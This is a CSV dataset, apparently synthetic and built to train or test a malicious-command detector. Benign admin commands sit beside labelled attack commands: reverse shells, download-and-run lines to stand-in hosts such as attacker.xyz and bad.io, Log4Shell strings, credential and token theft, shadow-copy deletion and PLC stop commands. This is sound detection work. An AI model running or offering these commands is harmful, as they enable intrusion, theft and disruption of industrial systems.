timestamp,src_ip,input,label
2026-01-20T18:06:49.605716,121.199.250.138,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.603716,87.113.48.130,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.625855,153.198.133.218,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.635464,16.208.69.105,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.606716,61.110.166.213,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.578927,179.106.63.143,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.639217,33.93.9.74,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.649821,130.178.254.159,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.641230,97.147.82.181,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.598537,149.46.119.207,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.592206,221.239.229.194,df -h,Normal_Business_Ops
2026-01-20T18:06:49.590224,159.24.156.129,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.643231,220.235.11.64,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.611343,88.49.69.21,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.614343,38.192.162.213,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.647820,202.22.100.13,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.603716,187.48.180.39,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.581995,5.54.39.33,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.578927,67.102.239.26,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.591206,30.110.149.30,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.588562,66.137.106.174,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.601211,17.29.118.19,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.640252,102.225.251.102,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.602715,2.28.81.72,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.613343,149.19.212.229,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.637464,55.244.4.246,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.578927,220.129.251.242,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.622713,116.63.75.248,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.599537,10.141.52.79,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.652043,72.16.47.117,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.615344,88.246.189.33,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.627851,171.83.214.170,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.610343,192.111.159.16,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.630463,174.24.150.164,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.645823,37.239.75.17,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.632463,18.19.234.76,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.645231,11.184.210.97,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.599537,135.108.100.19,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.613343,156.32.184.216,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.619742,59.117.45.235,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.584995,187.155.123.109,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.598537,96.105.100.160,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.605716,130.6.75.111,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.596536,155.233.201.203,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.645823,168.175.16.136,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,149.95.115.64,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.651526,21.253.25.57,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.576420,133.211.170.218,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.600538,22.153.187.132,whoami,Normal_Business_Ops
2026-01-20T18:06:49.592928,137.79.217.139,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.655127,17.54.215.209,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.599537,39.98.25.29,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.654031,190.56.215.101,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.601211,175.35.48.154,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.575395,163.232.212.52,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.580022,209.200.1.144,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.606716,196.146.42.189,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.610343,141.127.183.225,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655127,120.241.89.239,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.633463,84.98.61.64,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.592206,118.190.92.251,npm start,Normal_Business_Ops
2026-01-20T18:06:49.629483,159.169.216.152,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.585564,169.91.157.55,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.645231,21.68.61.56,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.605716,69.77.156.235,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.580995,127.237.29.21,git branch,Normal_Business_Ops
2026-01-20T18:06:49.597537,204.201.50.196,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.640252,178.218.35.168,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.617074,214.37.119.65,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.580995,83.2.70.234,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.622713,141.143.16.168,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.603716,197.189.216.123,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.597537,152.216.141.180,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.599537,201.106.111.96,uptime,Normal_Business_Ops
2026-01-20T18:06:49.604716,212.223.239.107,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.610343,8.77.242.215,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.576929,66.194.249.196,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.622713,157.100.255.170,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.630463,196.24.48.110,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.593923,76.129.246.167,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.596536,130.45.194.48,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.578927,138.150.185.198,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.587562,165.168.82.99,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.621712,153.122.70.228,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.641230,81.113.189.83,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.581995,197.14.233.53,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.649821,194.57.141.242,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.618055,20.106.68.121,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.601728,183.252.128.127,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.582995,146.173.97.82,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.610343,45.113.83.56,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.625855,104.154.159.175,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.605716,120.226.3.152,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.598537,92.191.116.8,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.648870,35.102.5.23,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.587562,38.59.61.108,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.602715,149.197.85.219,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.590224,179.64.60.163,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.625855,103.10.72.47,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.620713,56.151.185.128,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.627851,74.34.116.19,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.605716,79.249.169.60,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.629483,98.253.238.62,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.637464,191.174.254.217,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.619055,166.37.63.54,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.650820,184.195.122.78,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.606716,30.221.83.22,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.649821,202.48.5.8,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.595541,223.193.227.99,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.611343,192.247.64.179,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.650820,62.16.109.225,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.646819,65.171.201.166,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.582995,51.248.239.65,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.636464,68.37.157.186,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.641230,190.247.189.86,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.614343,111.105.93.101,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.646819,152.99.145.68,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.601728,25.44.220.190,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.645231,160.175.164.233,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.604716,144.37.254.253,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.602715,117.243.249.17,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.630463,207.66.65.37,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.601728,164.53.69.112,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.583995,47.73.223.150,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.621712,208.55.151.143,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.625345,102.127.27.176,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.647820,111.208.15.6,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.580022,196.251.214.84,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.637464,189.181.198.209,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.614343,44.15.40.225,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.584995,179.165.46.105,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.624776,45.5.135.198,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.637464,195.214.196.188,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.605716,93.11.152.74,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.630463,34.249.190.122,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.593923,127.46.157.153,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.655127,181.130.43.26,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.593923,5.101.246.118,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.644231,219.42.110.53,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.619742,75.127.11.215,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.629483,105.145.57.57,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.591206,6.219.25.211,make build,Normal_Business_Ops
2026-01-20T18:06:49.590224,92.47.53.189,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.617074,166.14.251.231,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.642230,9.189.159.151,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.615344,132.30.33.158,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.654031,55.157.78.27,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.580995,105.54.28.72,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.655635,150.90.151.203,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.650820,176.236.144.4,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.624776,137.222.168.89,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.589562,44.211.7.234,npm start,Normal_Business_Ops
2026-01-20T18:06:49.617074,82.14.87.35,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.627851,137.127.130.83,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.655635,48.134.13.226,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.619742,214.155.87.154,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.646819,44.78.163.51,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.623750,132.210.12.64,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.576420,13.120.176.228,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.576929,177.32.124.80,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.590224,131.82.93.139,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.585564,132.158.180.42,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.611343,154.96.231.159,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.611343,123.112.48.8,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.613343,11.31.161.233,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.643231,200.29.186.109,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.620713,110.14.189.198,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.594923,197.36.217.137,git pull,Normal_Business_Ops
2026-01-20T18:06:49.593923,26.99.12.43,whoami,Normal_Business_Ops
2026-01-20T18:06:49.615344,85.176.20.47,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.618055,10.4.155.224,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.588562,112.213.110.105,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.580022,10.0.135.157,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.635464,39.152.249.69,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.623750,196.11.120.184,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.578927,32.240.227.178,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.613343,142.242.214.9,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.635464,201.21.61.161,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.576420,92.144.9.166,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.585564,29.164.193.154,git branch,Normal_Business_Ops
2026-01-20T18:06:49.577927,159.146.81.129,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.595541,201.204.159.25,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.608346,3.4.220.204,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.619055,58.221.122.155,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.592928,35.137.236.60,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.635464,167.218.96.210,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.594923,2.57.237.111,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.597537,97.100.8.71,git pull,Normal_Business_Ops
2026-01-20T18:06:49.578927,2.209.113.81,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.632463,104.217.123.62,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.632463,55.55.95.2,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.624776,95.104.159.242,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.617074,149.228.103.182,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.632463,177.34.190.179,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.599537,9.39.68.165,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.649821,17.230.121.96,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.598537,153.43.24.152,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.654031,136.73.46.85,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.655635,213.251.43.202,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.655127,99.25.245.159,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.619742,148.134.245.142,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.598537,52.205.238.195,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.588562,3.219.157.125,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.589562,124.119.24.205,df -h,Normal_Business_Ops
2026-01-20T18:06:49.606716,73.210.23.122,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.596536,21.113.2.22,git remote -v,Normal_Business_Ops
2026-01-20T18:06:49.595541,26.89.104.175,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.612343,151.22.191.185,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.617074,151.36.63.124,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.652043,65.65.152.149,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.583995,167.132.54.174,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.601211,113.190.144.10,make build,Normal_Business_Ops
2026-01-20T18:06:49.654619,91.113.131.86,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.601211,207.120.154.229,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.621712,170.144.60.185,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.598537,160.155.84.220,git add .,Normal_Business_Ops
2026-01-20T18:06:49.646819,125.66.128.248,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,198.246.13.57,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.637464,3.119.108.125,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.608346,206.207.81.220,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.625855,69.32.217.2,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.614343,122.234.143.131,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.648870,30.52.248.109,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.586561,100.232.120.77,git pull,Normal_Business_Ops
